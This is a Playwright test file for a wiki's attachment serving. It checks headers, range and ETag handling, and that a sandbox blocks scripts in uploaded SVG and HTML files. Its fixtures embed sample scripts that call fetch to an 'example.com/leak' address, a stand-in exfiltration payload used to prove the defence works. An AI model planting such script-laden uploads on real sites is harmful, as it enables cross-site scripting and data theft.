import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";

import { download, pngBytes, uploadAsset, utf8, type UploadFile } from "../../fixtures/assets";
import { createNotebook } from "../../fixtures/notebooks";
import { expect, test } from "../../fixtures/test";
import { newTeam } from "../../fixtures/workspaces";

// AS5, an attachment's content is served so that it cannot act as the site
// (M7 design 4.5; M7/P2 design 3.6): shown inline only for an image, an
// audio, a video or a PDF, downloaded otherwise, under its name; every
// answer sandboxed, cached privately until its address expires, readable
// by no other site. Only a browser proves what the sandbox stops: the page
// version opens the addresses themselves (v0.1 design 10.1's exception).

/** The policy of every content's answer. */
const contentPolicy = "sandbox; default-src 'none'; img-src 'self' data:; media-src 'self'; style-src 'unsafe-inline'";

/** An SVG whose script would retitle it and call another site, were it run. */
const svgBytes = utf8(
  `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><title>drawing</title>` +
    `<script>document.title = "ran"; fetch("https://example.com/leak");</script>` +
    `<rect width="10" height="10" fill="red"/></svg>`
);

/** An HTML page whose script would do the same. */
const htmlBytes = utf8(
  `<!doctype html><title>page</title><script>document.title = "ran"; fetch("https://example.com/leak");</script>`
);

/** Each file, how it is served: its type, and whether a browser shows it, under the name the header gives. */
const files: { file: UploadFile; mime: string; inline: boolean; filename: string }[] = [
  {
    file: { name: "diagram.png", bytes: pngBytes },
    mime: "image/png",
    inline: true,
    filename: `filename="diagram.png"; filename*=UTF-8''diagram.png`,
  },
  {
    file: { name: "drawing.svg", bytes: svgBytes },
    mime: "image/svg+xml",
    inline: true,
    filename: `filename="drawing.svg"; filename*=UTF-8''drawing.svg`,
  },
  {
    file: { name: "paper.pdf", bytes: utf8("%PDF-1.4\n%%EOF\n") },
    mime: "application/pdf",
    inline: true,
    filename: `filename="paper.pdf"; filename*=UTF-8''paper.pdf`,
  },
  {
    file: { name: "page.html", bytes: htmlBytes, type: "text/html" },
    mime: "application/octet-stream",
    inline: false,
    filename: `filename="page.html"; filename*=UTF-8''page.html`,
  },
  {
    file: { name: "图表 v2.txt", bytes: utf8("chart\n") },
    mime: "application/octet-stream",
    inline: false,
    filename: `filename="__ v2.txt"; filename*=UTF-8''%E5%9B%BE%E8%A1%A8%20v2.txt`,
  },
];

test("AS5 (API): each type's content is shown or downloaded under its name, sandboxed, cached privately until its address expires, for no other site; ranges and conditions are answered", async ({
  api,
  nervewiki,
}, testInfo) => {
  const { pat, workspace } = await newTeam(api, testInfo);
  const notebook = await createNotebook(api, pat, workspace.slug, "Plans");

  for (const { file, mime, inline, filename } of files) {
    // oxlint-disable-next-line no-await-in-loop -- one attachment at a time, each checked
    const asset = await uploadAsset(api, pat, notebook.id, file);
    const etag = `"${createHash("sha256").update(file.bytes).digest("hex")}"`;
    for (const [address, shown] of [
      [asset.content_url, inline],
      [asset.download_url, false],
    ] as const) {
      // oxlint-disable-next-line no-await-in-loop -- its two addresses
      const answer = await download(nervewiki.baseURL, address);
      expect(answer.status, `${file.name} at ${address}`).toBe(200);
      const headers = Object.fromEntries(answer.headers);
      const maxAge = Number(/^private, max-age=(\d+), immutable$/.exec(headers["cache-control"] ?? "")?.[1]);
      expect(
        {
          type: headers["content-type"],
          disposition: headers["content-disposition"],
          policy: headers["content-security-policy"],
          etag: headers.etag,
          corp: headers["cross-origin-resource-policy"],
          nosniff: headers["x-content-type-options"],
          frames: headers["x-frame-options"],
          referrer: headers["referrer-policy"],
          cachedAnHourOrTwo: maxAge > 3500 && maxAge <= 7200,
        },
        `${file.name} at ${address}`
      ).toEqual({
        type: mime,
        disposition: `${shown ? "inline" : "attachment"}; ${filename}`,
        policy: contentPolicy,
        etag,
        corp: "same-origin",
        nosniff: "nosniff",
        frames: "DENY",
        referrer: "same-origin",
        cachedAnHourOrTwo: true,
      });
      // oxlint-disable-next-line no-await-in-loop -- its body
      expect(Buffer.compare(Buffer.from(await answer.arrayBuffer()), Buffer.from(file.bytes))).toBe(0);
    }
    // oxlint-disable-next-line no-await-in-loop -- a range of it
    const range = await download(nervewiki.baseURL, asset.content_url, { Range: "bytes=0-3" });
    expect([range.status, range.headers.get("content-range")]).toEqual([206, `bytes 0-3/${file.bytes.length}`]);
    // oxlint-disable-next-line no-await-in-loop -- its body
    expect(Buffer.from(await range.arrayBuffer())).toEqual(Buffer.from(file.bytes.subarray(0, 4)));
    // oxlint-disable-next-line no-await-in-loop -- a read conditioned on what the client has
    const unchanged = await download(nervewiki.baseURL, asset.content_url, { "If-None-Match": etag });
    expect(unchanged.status).toBe(304);
  }
});

test("AS5 (page): an SVG opened at its address runs no script and calls no other site; an HTML attachment is downloaded, not shown", async ({
  api,
  nervewiki,
  page,
  pageWatch,
}, testInfo) => {
  const { pat, workspace } = await newTeam(api, testInfo);
  const notebook = await createNotebook(api, pat, workspace.slug, "Plans");
  const svg = await uploadAsset(api, pat, notebook.id, { name: "drawing.svg", bytes: svgBytes });
  const html = await uploadAsset(api, pat, notebook.id, { name: "page.html", bytes: htmlBytes, type: "text/html" });
  const elsewhere: string[] = [];
  page.on("request", (request) => {
    if (new URL(request.url()).origin !== new URL(nervewiki.baseURL).origin) {
      elsewhere.push(request.url());
    }
  });

  const svgURL = new URL(svg.content_url, nervewiki.baseURL).toString();
  await page.goto(svgURL);
  await expect(page.locator("rect")).toBeAttached();
  expect(await page.title(), "the SVG's title, which its script would change").toBe("drawing");

  const htmlURL = new URL(html.content_url, nervewiki.baseURL).toString();
  const [downloaded] = await Promise.all([
    page.waitForEvent("download"),
    page.goto(htmlURL).catch(() => undefined), // a download is no navigation
  ]);
  expect(downloaded.suggestedFilename()).toBe("page.html");
  expect(readFileSync(await downloaded.path())).toEqual(Buffer.from(htmlBytes));
  expect(page.url(), "the page stays on the SVG").toBe(svgURL);
  expect(elsewhere, "requests to another site").toEqual([]);

  // Chromium says the sandbox blocked the SVG's script, and the scripts the
  // watch puts in every document: that alone, once for each.
  const blocked = `Blocked script execution in '${svgURL}' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.`;
  expect(pageWatch.consoleErrors.length, "the blocked scripts").toBeGreaterThan(0);
  expect(new Set(pageWatch.consoleErrors)).toEqual(new Set([blocked]));
  pageWatch.expectConsole({ errors: pageWatch.consoleErrors.map(() => blocked) });
});
